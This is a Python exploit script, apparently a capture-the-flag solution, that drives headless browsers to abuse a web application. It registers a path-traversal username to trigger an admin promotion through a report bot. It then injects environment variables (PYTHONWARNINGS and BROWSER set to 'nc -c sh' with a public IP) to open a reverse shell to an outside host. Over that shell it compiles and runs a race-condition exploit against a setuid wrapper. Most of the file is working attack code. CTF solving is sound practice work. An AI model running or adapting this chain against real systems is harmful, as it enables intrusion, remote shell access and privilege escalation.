from requests import session, Session
from pwn import *
from typing import Dict
import os
import base64

URL = "https://e68d540c0748fdeac7ea2f1e75afeb88.dryy.xyz"
IP = "79.85.156.133"  # public ip
PORT = 8000  # public & local port

from playwright.sync_api import (
    sync_playwright,
    Page,
    Playwright,
    Browser,
    BrowserContext,
)


class Bot:
    def __init__(
        self, username: str, password: str, base_url: str, playwright: Playwright
    ):
        self.username: str = username
        self.password: str = password
        self.base_url: str = base_url
        self.playwright: Playwright = playwright
        self.browser: Browser = self.playwright.chromium.launch(headless=True)
        self.context: BrowserContext = self.browser.new_context()
        self.page: Page = self.context.new_page()

    def register(self):
        url = f"{self.base_url}/register"
        self.page.goto(url)
        self.page.fill('input[name="username"]', self.username)
        self.page.fill('input[name="password"]', self.password)
        self.page.click('button[type="submit"]')

    def login(self):
        url = f"{self.base_url}/login"
        self.page.goto(url)
        self.page.fill('input[name="username"]', self.username)
        self.page.fill('input[name="password"]', self.password)
        self.page.click('button[type="submit"]')

    def get_id(self):
        url = f"{self.base_url}/profile"
        self.page.goto(url)
        self.page.wait_for_load_state("domcontentloaded")
        # self.page.screenshot(path="./id.png")
        return self.page.locator("#id").inner_text()

    def get_web_flag(self):
        url = f"{self.base_url}/env"
        self.page.goto(url)
        self.page.wait_for_load_state("domcontentloaded")
        return self.page.locator("#webflag").inner_text()

    def logout(self):
        url = f"{self.base_url}/logout"
        self.page.goto(url)

    def report(self, url_to_report: str):
        url = f"{self.base_url}/report"
        self.page.goto(url)
        self.page.fill('input[name="url"]', url_to_report)
        self.page.click('button[type="submit"]')

    def env(self, key: str, value: str):
        url = f"{self.base_url}/env"
        self.page.goto(url)
        form = self.page.locator("form#create")

        # Fill key and value
        form.locator('input[name="key"]').fill(key)
        form.locator('input[name="value"]').fill(value)

        # Submit the form
        form.locator('button[type="submit"]').click()

    def visit(self, path_or_url: str):
        if path_or_url.startswith("http://") or path_or_url.startswith("https://"):
            self.page.goto(path_or_url)
        else:
            self.page.goto(f"{self.base_url}/{path_or_url.lstrip('/')}")
        self.page.screenshot(path="./env.png")

    def reset_page(self):
        self.page.close()
        self.page = self.context.new_page()

    def start_backup(self):
        self.page.goto(f"{self.base_url}/env")
        backup_form = self.page.locator("form#backup-form")
        backup_form.locator('button[type="submit"]').click()

    def close(self):
        self.context.close()
        self.browser.close()


def gen_random_str() -> str:
    return base64.b64encode(os.urandom(16)).decode()


# Entry point for quick manual test
if __name__ == "__main__":
    pw = sync_playwright().start()
    bot_1 = Bot(
        username=gen_random_str(),
        password=gen_random_str(),
        base_url=URL,
        playwright=pw,
    )
    bot_1.register()
    bot_1.login()
    bot_2 = Bot(
        username=f"../../api/promote/{bot_1.get_id()}",
        password=gen_random_str(),
        base_url=URL,
        playwright=pw,
    )
    bot_2.register()
    bot_2.login()
    bot_2.report(f"{URL}/?filter=../../api/user/{bot_2.get_id()}")
    bot_2.close()
    sleep(3)
    bot_1.logout()
    bot_1.reset_page()
    bot_1.login()
    # bot_1.page.screenshot(path="./logged_in.png")

    print(bot_1.get_web_flag())

    bot_1.env("PYTHONWARNINGS", "all:0:antigravity.x:0:0")
    bot_1.env("BROWSER", f"nc -c sh {IP} {PORT} #%s")

    # bot_1.visit("/env")
    listener = listen(PORT)

    bot_1.start_backup()

    listener.wait_for_connection()

    listener.sendline(b"cat rceflag.txt")
    print(listener.recvline().decode())
    listener.sendline(b"cd")
    listener.sendline(b"cat << EOF > main.c")
    with open("./main.c", "rb") as f:
        lines = f.readlines()
        for l in lines:
            listener.send(l)
    listener.sendline(b"EOF")
    listener.sendline(b"gcc -o race ./main.c")
    listener.sendline(b"./race &")
    res = b""
    while not b"STHACK" in res:
        listener.sendline(b"./suid_wrapper && cat *.log")
        res += listener.recvall(timeout=1)
        sleep(0.1)

    print(res.decode())
    listener.sendline(b"pkill race")

    listener.close()

    pw.stop()
